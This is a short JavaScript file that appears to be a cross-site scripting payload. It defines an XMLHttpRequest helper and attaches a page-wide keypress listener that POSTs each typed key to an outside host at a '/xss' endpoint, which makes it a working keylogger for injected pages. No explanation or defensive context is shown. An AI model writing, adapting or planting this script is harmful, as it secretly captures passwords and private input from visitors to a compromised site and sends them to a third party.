
function ajaxRequest (method, url, data, cb) {
    var xmlHttp = new XMLHttpRequest()

    if (xmlHttp.overrideMimeType) {
        xmlHttp.overrideMimeType('text/plain; charset=x-user-defined')
    }

    xmlHttp.open(method, url, true)

    if (cb) {
        xmlHttp.onreadystatechange = function () {
            if (xmlHttp.readyState === 4) {
                cb(xmlHttp)
            }
        }
    }

    xmlHttp.send(data)
    return xmlHttp
}

document.addEventListener('keypress', function (e) {
    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', 'key=' + e.key)
})